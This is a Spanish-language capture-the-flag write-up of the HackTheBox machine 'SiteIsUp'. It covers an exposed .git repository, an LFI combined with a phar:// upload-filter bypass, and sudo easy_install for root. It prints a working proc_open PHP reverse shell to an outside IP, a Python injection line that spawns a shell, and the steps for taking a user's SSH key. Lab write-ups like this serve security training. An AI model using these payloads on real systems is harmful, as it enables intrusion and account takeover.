![[Pasted image 20250505092824.png]]


**Publicado:** 05 de Mayo de 2025 
**Autor:** José Miguel Romero aka x3m1Sec 
**Dificultad:** ⭐ Medium

## 📝 Descripción

"SiteIsUp" es una máquina Linux de dificultad fácil en HackTheBox que simula un servicio web para verificar si otros sitios están en línea. La vulnerabilidad principal radica en una aplicación web con múltiples fallas de seguridad, incluyendo un repositorio Git expuesto y un LFI (Local File Inclusion) que puede ser aprovechado para conseguir RCE (Remote Code Execution). Para la escalada de privilegios, se abusa de permisos sudo en la herramienta easy_install. Este laboratorio es perfecto para practicar reconocimiento web, análisis de código fuente, bypass de restricciones de subida de archivos y explotación de vulnerabilidades comunes en aplicaciones web.
## 🚀 Metodología

```mermaid
flowchart TD
    A[Reconocimiento Inicial] --> B[Enumeración Web]
    B --> C{Repositorio .git expuesto}
    C --> D[Extracción de código fuente]
    D --> E[Descubrimiento de parámetro de cabecera 'only4dev']
    E --> F[Acceso a funcionalidades ocultas]
    F --> G[Panel administrador]
    F --> H[Función de subida de archivos]
    G --> I[Parámetro page vulnerable a LFI]
    H --> J[Bypass de restricciones de extensión]
    I --> K[Uso de wrapper phar://]
    J --> K
    K --> L[Ejecución de código PHP]
    L --> M[RCE vía proc_open]
    M --> N[Reverse shell como www-data]
    N --> O[Explotación de script Python sin sanitización]
    O --> P[Acceso como usuario developer]
    P --> Q[Extracción de clave SSH]
    Q --> R[Login SSH como developer]
    R --> S[Escalada con sudo en easy_install]
    S --> T[Shell como root]
    T --> U[Captura de flag]
```




## 🔭 Reconocimiento

### Ping para verificación en base a TTL

```bash
ping -c2 10.10.11.177
PING 10.10.11.177 (10.10.11.177) 56(84) bytes of data.
64 bytes from 10.10.11.177: icmp_seq=1 ttl=63 time=49.0 ms
64 bytes from 10.10.11.177: icmp_seq=2 ttl=63 time=48.5 ms

--- 10.10.11.177 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 48.539/48.760/48.982/0.221 ms
```

> 💡 **Nota**: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.

### Escaneo de puertos

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.177 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

### Enumeración de servicios
```bash
nmap -sC -sV -p$ports 10.10.11.177

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Is my Website up ?
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.78 seconds
```


![[Pasted image 20250505093635.png]]

<div align="center">

```
10.10.11.177 - siteisup.htb
```

</div>

> ⚠️   Debemos agregar este dominio a nuestro archivo hosts.

```bash
echo "10.10.11.177 siteisup.htb" | sudo tee -a /etc/hosts
```


#### 💉 Probando inyecciones de comandos

Tras probar con diversos payloads para ver si podemos realizar inyección de comandos sobre el parámetro del campo de texto, no muestra un mensaje en el que indica que está detectando un intento de hacking:

```
http://www.google.es; whoami
324234234 || ls
```

![[Pasted image 20250505121124.png]]
#### 🕷️ Fuzzing de vhosts

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://siteisup.htb -H 'Host:FUZZ.siteisup.htb' -fs 1131
```


![[Pasted image 20250505104335.png]]


 ⚠️   Debemos agregar este dominio a nuestro archivo hosts.

```bash
echo "10.10.11.177 dev.siteisup.htb" | sudo tee -a /etc/hosts
```

## 🌐 Enumeración Web

A continuación verificamos que no tenemos permiso para acceder a este recurso.
![[Pasted image 20250505104504.png]]


Realizamos fuzzing de directorios usando feroxbuster

```
feroxbuster -u http://siteisup.htb -r  -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt --scan-dir-listings -C 403,404
```

Encontramos un directorio .git:

![[Pasted image 20250505110516.png]]


A continuación usamos la herramienta git dumper para facilitar la revisión del repositorio de código.

```
git_dumper http://siteisup.htb/dev git-dump
```


Una vez descargado el código, en el fichero changelog encontramos información que podría ser interesante:
![[Pasted image 20250505111146.png]]

También hay un parámetro especial "only4dev" que se puede enviar e la cabecera de la petición
![[Pasted image 20250505112025.png]]

A continuación, hacemos una petición a http://dev.siteisup.htb interceptando con Burp y probamos a añadir este parámetro en la cabecera

```
Special-Dev
only4dev
```


![[Pasted image 20250505113345.png]]


Podemos usar también la extensión para firefox https://addons.mozilla.org/es-ES/firefox/addon/simple-modify-header/:

![[Pasted image 20250505114920.png]]
Al hacer esto descubrimos un enlace al panel de administrador y un botón para la subida de archivos.

![[Pasted image 20250505115030.png]]

En lo que respecta al enlace del panel de administrador, vemos que somos redirigidos a:

http://dev.siteisup.htb/?page=admin

![[Pasted image 20250505115048.png]]

Echando un vistazo al código fuente de esta sección vemos qué parámetro se acepta en la petición que nos permite apuntar a un recurso aunque se están aplicando ciertos filtros para evitar un posible LFI:

![[Pasted image 20250505114459.png]]


Respecto al botón para la subida de archivos:
![[Pasted image 20250505115123.png]]

Si revisamos el código fuente anteriormente descargado del repositorio .git en checker.php:

![[Pasted image 20250505113939.png]]

Podemos ver las extensiones para la carga de archivos que están permitidas. También podemos ver que se crea un directorio en  uploads/ obteniendo el timestamp de la hora de la subida y aplicado posteriormente la codificación en md5.

También es importante verifica que el archivo se borra una vez después de subirse.

Comprobamos que el directorio /uploads está vacío: 

![[Pasted image 20250505115114.png]]
Vamos a intentar subir un archivo php con alguna extensión que permita saltarnos la restricción de extensión, por ejemplo usando la webshell de pentestmonkey y renombándola con extensión .phar:

```
cp /usr/share/webshells/php/php-reverse-shell.php .
mv php-reverse-shell.php shell.phar
```

Verificamos que el fichero se ha subido correctamente y tal como habíamos analizado previamente en el código, sea ha creado un directorio con el timestamp de la fecha codificado en MD5:
![[Pasted image 20250505115430.png]]

El problema, es que el enlace al archivo se está borrando después de subirse.

![[Pasted image 20250505115622.png]]

## 💉 Explotación

Recapitulando, en este punto tenemos por un lado, un parámetro page (http://dev.siteisup.htb/?page=XXX) que nos permite leer archivos desde la raíz y que cuando le pasamos un valor le concatena la extensión .php. Por otro lado, conocemos las extensiones que se están filtrando al intentar subir un archivo.

En este punto la mejor opción sería encapsular nuestro archivo .php dentro de un archivo .zip y leerlo con un wrapper .zip, aunque lo descartamos porque la extensión .zip se está filtrando, así que lo que podemos hacer es comprimirlo con una extensión cualquiera que no se esté filtrando e intentar leer el código .php con un wrapper php. Ejemplo:

Creamos nuestro archivo .php haciendo un phpinfo y de esta forma podemos ver qué funciones están deshabilitadas:

```
mousepad info.php
```

info.php
```php
<?php phpinfo(); ?>
```

```
zip test.pwned info.php
```


Subimos el archivo.

![[Pasted image 20250505125139.png]]


Usamos el wrapper php en la url con el paámetro page para llamar a nuestra shell

 ⚠️   No Debemos agregar la extensión php a nuestro archivo ya que recordemos que tal como vimos en el código fuente se le está concatenando al final.
 
![[Pasted image 20250505124416.png]]


```
http://dev.siteisup.htb/?page=phar://uploads/92b4ba864769f5ab9b0708c96412332a/test.pwned/info
```

A continuación verificamos las disable_functions:

![[Pasted image 20250505125631.png]]

Para verificar qué función podemos usar, podemos utilizar la herramienta dfunc-bypasser a la cual podemos pasarle una url con el php.info y te indica de qué función de sistema php puedes abusar para ejecutar comandos:

https://github.com/teambi0s/dfunc-bypasser

Podemos usar la herramienta con el parámetro --file especificando el arhivo info.php. Para ello podemos interceptar la petición con burp y en la respuesta renderizada hacer un copy to file:


![[Pasted image 20250505131200.png]]

```
dfunc_bypasser --file info.php 
```

![[Pasted image 20250505131319.png]]

La herramienta nos indica que podemos usar proc_open. Para ver cómo usar esta función podemos hacer uso de la documentación oficial:

https://www.php.net/manual/en/function.proc-open.php

Podemos adaptar nuestro archivo .php para que haga uso de esta función y obtener una reverse shell de la siguiente forma:

 reverse shell con proc_open function
```php
<?php  
  
$descriptorspec = [  
  
0 => ["pipe", "r"], // STDIN  
  
1 => ["pipe", "w"], // STDOUT  
  
2 => ["pipe", "w"], // STDERR  
  
];  
  
$command = "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.8/1234 0>&1'";  
  
$process = proc_open($command, $descriptorspec, $pipes);  
  
if (is_resource($process)) {  
  
fclose($pipes[0]); // Close STDIN  
  
fclose($pipes[1]); // Close STDOUT  
  
fclose($pipes[2]); // Close STDERR  
  
proc_close($process);  
  
}  
  
?>
```

Creamos nuestra reverse shell y la encapsulamos con cualquier extensión que no esté filtrada:

```
zip revshell.test shell.php 
```

Tras subirla, iniciamos un listener en el puerto que hayamos especificado volvemos a hacer uso del wrapper para llamarla:

![[Pasted image 20250505131859.png]]

```
http://dev.siteisup.htb/?page=phar://uploads/64fbd80378990182b061d4ceca662019/revshell.test/shell
```

![[Pasted image 20250505131955.png]]


Tras ganar acceso, hacemos un full tty de nuestra shell:
```
SHELL=/bin/bash script -q /dev/null
```

Encontramos un script en python sobre el que el usuario www-data tiene permisos de lectura y ejecución:

![[Pasted image 20250505132815.png]]


El script parece que toma la entrada del usuario sin sanitizarla. Podemos abusar de esto pasándo el siguiente parámetro a la función y escalar a developer:
```
./siteisup
__import__('os').system('/bin/bash')
```


![[Pasted image 20250505133340.png]]

Seguimos sin tener permisos para leer la flag de /home/developer:

![[Pasted image 20250505133511.png]]

Dado que sí tenemos permisos para leer el directorio .ssh, vamos a usar la clave ssh para conectarnos:

![[Pasted image 20250505133607.png]]

```
chmod 600 id_rsa_developer
ssh -i id_rsa_developer developer@10.10.11.177
```

```
developer@updown:/home$ cd developer
developer@updown:~$ cat user.txt
*****************e96462e932704
```

## 🔐 Escalada de Privilegios

Verificamos posibles archivos que  puede ejecutar developer como root:

![[Pasted image 20250505133904.png]]

Encontramos información sobre este binario y posibles formas de explotación en gtfobins:

https://gtfobins.github.io/gtfobins/easy_install/#sudo

![[Pasted image 20250505134559.png]]

![[Pasted image 20250505134612.png]]

```
# cd /root
# ls
lib  root.txt  snap
# cat root.txt
********************b74055c0788b423b4a
```